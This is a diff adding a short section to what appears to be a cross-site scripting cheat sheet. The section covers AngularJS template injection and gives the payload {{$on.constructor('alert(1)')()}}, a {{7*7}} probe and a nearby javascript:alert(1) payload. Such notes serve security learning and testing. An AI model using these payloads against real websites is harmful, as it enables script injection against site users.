@@ -144,6 +144,14 @@ You searched for: [YOUR INPUT HERE]
 ```
 → Use javascript: protocol: `javascript:alert(1)`
 
+**AngularJS expression context** (inside ng-app scope, angle brackets encoded):
+```html
+<body ng-app> ... 0 results for YOUR_INPUT ... </body>
+```
+→ `<>` and `"` are encoded — inject template expression instead: `{{$on.constructor('alert(1)')()}}`  
+→ Confirm Angular is active: search `{{7*7}}`, if page shows `49` you're in scope  
+→ See `09-angularjs-template-injection.md`
+
 ---
 
 ## Encoding reference (for delivering via URL)
